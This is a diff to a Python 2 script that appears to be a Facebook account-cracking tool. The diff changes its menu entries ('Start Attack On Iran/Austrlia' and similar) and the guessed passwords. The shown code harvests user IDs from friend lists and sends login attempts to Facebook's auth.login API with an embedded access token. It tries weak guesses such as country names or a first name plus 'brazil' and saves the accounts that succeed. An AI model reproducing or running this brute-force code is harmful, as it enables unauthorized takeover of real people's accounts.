@@ -248,11 +248,11 @@ def menu():
 	print "	   \033[1;93m ◄►••◄►Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
 	print "	   \033[1;93m ◄►••◄►ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
 	print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•\033[1;91mArbab-Memon\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
-	print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m1.\x1b[1;93m Start Attack On Iran√"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;92m Start Attack On Germany√"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;96m Start Attack On Afghanistan√"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m4.\x1b[1;95m Start Attack On Japan/Korean√"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m5.\x1b[1;94m Start Attack On Iraq√"
+	print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m1.\x1b[1;93m Start Attack On Iran/Austrlia"
+        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;92m Start Attack On Germany/Brazail"
+        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;96m Start Attack On Afghanistan/Switzerland"
+        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m4.\x1b[1;95m Start Attack On Japan/Korean/China"
+        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m5.\x1b[1;94m Start Attack On Iraq/Saudi Arabia"
         print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m7.\x1b[1;93m Start Attack All Countris"
         print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m8.\x1b[1;95m Start Attack Member Group Not complete"
         print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m9.\x1b[1;92m Start Target  Attack√"
@@ -357,8 +357,8 @@ def crack():
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m1.\x1b[1;95mClone Friend List Public ID Germany."
-        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;95mCyberHacker Group Germany."
+	print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m1.\x1b[1;95mClone Friend List Public ID Germany/Brazil."
+        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;95mCyberHacker Group Germany/Brazail."
         print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m3.\x1b[1;95mArbab-Memon Group Cloning Not complete."
         print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m4.\x1b[1;95mCyberHacker Youtube Chenal."
 	print "\033[1;93m-•◄►•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
@@ -504,7 +504,7 @@ def pilih_crack():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = 'germany'											
+						           pass4 = 'Brazil'											
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -614,7 +614,7 @@ def pilih_crack():
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass8)   	
 										                                   else:					
-										                                       pass9 = b['first_name'] + 'German'					
+										                                       pass9 = b['first_name'] + 'brazil'					
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
 										                                       q = json.load(data)				
 										                                       if 'access_token' in q:		
